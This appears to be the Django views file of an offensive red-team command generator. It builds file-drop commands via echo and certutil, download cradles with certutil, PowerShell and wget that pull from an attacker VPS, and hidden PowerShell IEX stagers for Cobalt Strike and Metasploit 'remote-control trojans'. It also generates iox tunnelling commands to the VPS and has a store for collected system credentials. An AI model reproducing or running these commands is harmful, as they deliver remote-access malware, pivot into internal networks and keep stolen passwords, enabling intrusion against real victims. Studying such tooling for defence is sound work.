import base64
import codecs
import os
import re
import traceback
import configparser
import random
from math import floor

from django.http import HttpRequest, HttpResponse, FileResponse
from django.shortcuts import render
from PwdModel.models import Pwd

from . import json

cmd_type_list = ["写入文件", "下载文件", "远控木马", "iox", "内网信息探测"]
cmd_functions = ["write_cmd", "download_cmd", "payload_cmd", "iox_cmd", "system_cmd"]

conf = configparser.ConfigParser()
conf.read((os.path.dirname(os.path.abspath("settings.py"))) + "\config.ini")
vps_url = conf.get("setting", "VPS_URL")
vps_ip = conf.get("setting", "VPS_IP")
cs_exe = conf.get("setting", "CS_EXE_URL")
cs_powershell = conf.get("setting", "CS_POWERSHELL_URL")
msf_exe = conf.get("setting", "MSF_EXE_URL")
msf_powershell = conf.get("setting", "MSF_POWERSHELL_URL")
key_list = [';', ':', " ", "\t"]

iox_payload = """
[FWD模式]: 
    *端口转发至本地: ./iox fwd -l {lport} -l {rport}
    *端口转发至VPS: ./iox fwd -l {lport} -r {vps_ip}:{vport}
[PROXY模式]:
    *本地开启Sock5服务: ./iox proxy -l {rport}
    *Sock5服务转发至VPS:
    <original>
        (localhost)    ./iox proxy -r {vps_ip}:9999 
        (vps)            ./iox proxy -l 9999 -l {vport}
    <encrypt>
        (localhost)    ./iox fwd -l 1080 -r *{vps_ip}:9999 -k 000102
        (vps)            ./iox proxy -l *9999 -k 000102
""".strip()


class CMD():
    def __init__(self, request: HttpRequest):
        self.cmd_type = int(request.POST["ctype"])
        self.encrypt_type = int(request.POST["etype"])
        self.write_type = int(request.POST['wtype'])
        self.file = (request.POST['file']).replace("\\", "/")
        self.url = request.POST["url"]
        self.content = request.POST["content"]
        self.lport = request.POST["lport"] if request.POST["lport"] else "3389"
        self.rport = request.POST["rport"] if request.POST["rport"] else "12345"
        self.vport = request.POST["vport"] if request.POST["vport"] else "12345"
        self.cs_exe = request.POST["vport"] if request.POST["vport"] else cs_exe
        self.msf_exe = request.POST["vport"] if request.POST["vport"] else msf_exe
        self.cs_powshell = cs_powershell
        self.msf_powshell = msf_powershell
        self.length = 25

    def write_cmd(self):
        def windows_cmd_0():  # 普通Windows写文件
            cmd_list = []
            all_content = self.content
            for i in range(0, floor(len(all_content) / self.length) + 1):
                content = all_content[self.length * i:self.length * (i + 1)]
                cmd1 = f"echo {content} >> {self.file}"
                cmd_list.append(cmd1)
            return cmd_list

        def windows_cmd_1():  # base64加密Windows写文件
            cmd_list = []
            all_content = base64.b64encode(self.content.encode()).decode()
            for i in range(0, floor(len(all_content) / self.length) + 1):
                content = all_content[self.length * i:self.length * (i + 1)]
                tmp_file = "/".join(self.file.split("/")[:-1]) + ("/tmp.txt" if "/" in self.file else "tmp.txt")
                cmd1 = f"echo {content} >> {tmp_file}"
                cmd_list.append(cmd1)
            cmd2 = f"certutil -decode {tmp_file} {self.file}"
            cmd3 = f"del {tmp_file}"
            cmd_list.append(cmd2)
            cmd_list.append(cmd3)
            return cmd_list

        def linux_cmd_0():  # 普通Linux写文件
            return windows_cmd_0()

        def linux_cmd_1():  # base64加密Linux写文件
            cmd_list = []
            all_content = base64.b64encode(self.content.encode()).decode()
            for i in range(0, floor(len(all_content) / self.length) + 1):
                content = all_content[self.length * i:self.length * (i + 1)]
                cmd1 = f"echo {content} | base64 -d >> {self.file}"
                cmd_list.append(cmd1)
            return cmd_list

        def php_cmd_0():
            return f"<?php file_put_contents('{self.file}', '{self.content}'); ?>"

        if self.write_type != 0:
            self.length = len(self.content)
        if self.encrypt_type == 0:
            windows_payload = windows_cmd_1()
            linux_payload = linux_cmd_1()
        else:
            windows_payload = windows_cmd_0()
            linux_payload = linux_cmd_0()
        cmd_dict = {"WINDOWS": windows_payload, "LINUX": linux_payload, "PHP": php_cmd_0()}
        return cmd_dict

    def download_cmd(self):
        def windows_cmd_0():
            return f"certutil.exe -urlcache -split -f {self.url} {self.file}"

        def powershell_cmd_0():
            return f"""
            powershell "($client = new-object System.Net.WebClient) -and ($client.DownloadFile('{self.url}', '{self.file}')) -and (exit)"
            """.strip()

        def linux_cmd_0():
            return f"wget {self.url} -P {self.file}"

        def php_cmd_0():
            return f"<?php copy('{self.url}', '{self.file}'); ?>"

        if not "http://" in self.url:
            self.url = vps_url + self.url
        return {"WINDOWS": windows_cmd_0(), "POWERSHELL": powershell_cmd_0(), "LINUX": linux_cmd_0(),
                "PHP": php_cmd_0()}

    def system_cmd(self):
        pass

    def payload_cmd(self):
        def windows_cmd_0(url):
            filename = str(random.randint(1, 999)) + ".exe"
            return [f"certutil.exe -urlcache -split {url} -f {filename} ", "cs.exe"]
        def windows_cmd_1(url):
            return f'''
            powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('{url}'))"
            '''.strip()
        return {
            "CobaltStrike-exe": windows_cmd_0(self.cs_exe),
            "CobaltStrike-powershell": windows_cmd_1(self.cs_powshell),
            "Metasploit-exe": windows_cmd_0(self.msf_exe),
            "Metasploit-powershell": windows_cmd_1(self.msf_powshell),
                }

    def iox_cmd(self):
        return iox_payload.format(vps_ip=vps_ip, lport=self.lport, rport=self.rport, vport=self.vport)

    def get_cmd(self):
        cmd_function = cmd_functions[int(self.cmd_type)]
        func = getattr(self, cmd_function)
        return func()


def get_cmd_ctx():
    ctx = {"cmd_type": cmd_type_list}
    return ctx


def cmd(request: HttpRequest):
    ctx = get_cmd_ctx()
    if request.method == "GET":
        return render(request, "cmd.html", ctx)
    else:
        cmd = CMD(request)
        result_text = []
        result = cmd.get_cmd()
        split_line = "\n" + "-" * 90 + "\n"
        if type(result) == dict:
            for k, v in result.items():
                if type(v) == list:
                    v = "\n    ".join(v)
                result_text.append(f"[{k}]:\n    {v}")
            result_text = split_line.join(result_text)
        else:
            result_text = result
        return HttpResponse(result_text)

def get_pwd_ctx():
    ctx = {"pwd_list": Pwd.objects.order_by("system").all()}
    return ctx



def pwd_list(request: HttpRequest):
    if request.method == "GET":
        return render(request, "pwd_list.html", get_pwd_ctx())

def add_pwd(requset: HttpRequest):
    pwd_text = requset.POST["pwd"]
    pwd_list = pwd_text.split("\n")
    print(pwd_list)
    for p in pwd_list:
        p = p.replace("，", ",")
        for k in key_list:
            p.replace(k, ",")
        p = p.split(",")
        try:
            pwd = Pwd(system=p[0], username=p[1], password=p[2])
            pwd.save()
        except:
            pass
    return HttpResponse("")